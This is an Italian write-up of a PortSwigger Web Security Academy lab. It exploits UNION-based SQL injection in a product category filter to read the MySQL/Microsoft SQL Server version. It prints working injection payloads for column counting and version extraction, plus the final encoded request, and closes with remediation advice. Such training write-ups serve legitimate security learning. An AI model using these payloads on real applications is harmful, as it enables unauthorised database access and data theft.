# SQL injection — Rilevamento tipo e versione del database (MySQL / Microsoft)

> **Autore:** Leonardo Onori — Junior Penetration Tester
> **Fonte:** PortSwigger Web Security Academy — *Querying the database type and version on MySQL and Microsoft*
> **Categoria:** OWASP A03:2021 – Injection · CWE-89
> **Severità:** High

---

## 1. Sintesi

L'applicazione e-commerce espone un filtro per categoria di prodotti vulnerabile a **SQL injection** di tipo UNION-based. Sfruttando la vulnerabilità è stato possibile recuperare la versione del DBMS sottostante — obiettivo del lab — dimostrando il controllo completo sulla clausola `SELECT`.

| | |
|---|---|
| **Parametro vulnerabile** | `category` (GET `/filter`) |
| **Tipo di injection** | UNION-based, in-band |
| **Numero di colonne** | 2 (entrambe di tipo testo) |
| **Stringa obiettivo** | `8.0.42-0ubuntu0.20.04.1` |

---

## 2. Punto di injection

Il filtro delle categorie genera una query del tipo:

```sql
SELECT ... FROM products WHERE category = '<input>' AND released = 1
```

L'input dell'utente viene concatenato tra apici singoli, consentendo di chiudere la stringa e iniettare SQL arbitrario.

## 3. Metodologia

### 3.1 Conteggio delle colonne

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -     → errore: la tabella ha 2 colonne
```

In alternativa, con payload UNION e valori `NULL`:

```sql
' UNION SELECT NULL,NULL-- -
```

### 3.2 Verifica delle colonne di tipo testo

```sql
' UNION SELECT 'abc','def'-- -
```

Entrambe le colonne restituiscono le stringhe a schermo: supportano dati testuali.

### 3.3 Estrazione della versione

```sql
' UNION SELECT @@version, NULL-- -
```

La funzione `@@version` è condivisa da **MySQL** e **Microsoft SQL Server**, motivo per cui i due DBMS sono trattati nello stesso scenario. La pagina restituisce:

```
8.0.42-0ubuntu0.20.04.1
```

## 4. Payload finale

```
GET /filter?category=Gifts' UNION SELECT @@version, NULL-- -
```

URL-encoded nella richiesta HTTP:

```
GET /filter?category=Gifts'+UNION+SELECT+@@version,NULL--+-
```

> **Nota sulla sintassi dei commenti** — MySQL richiede uno spazio dopo `-- `. Poiché lo spazio finale in URL viene perso, si usa la forma `-- -` (trattino-trattino-spazio-trattino) oppure `#` (`%23`). Su Microsoft SQL Server `--` è sufficiente.

## 5. Impatto

Il controllo sulla query `SELECT` permette, oltre al fingerprinting del DBMS, l'estrazione arbitraria di dati (credenziali, dati applicativi) e, a seconda dei permessi, operazioni più invasive. Il fingerprinting della versione è il primo passo di un attacco più ampio: identifica sintassi, funzioni e vulnerabilità note specifiche del motore.

## 6. Remediation

- **Query parametrizzate** (prepared statement) per ogni interazione con il database: l'input non viene mai concatenato nel testo SQL.
- **Principio del privilegio minimo** per l'utenza applicativa del database.
- **Gestione generica degli errori**, per non esporre messaggi o versioni del DBMS.

## 7. Riferimenti

- OWASP Top 10 — A03:2021 Injection
- CWE-89 — SQL Injection
- PortSwigger Web Security Academy — *Querying the database type and version on MySQL and Microsoft*
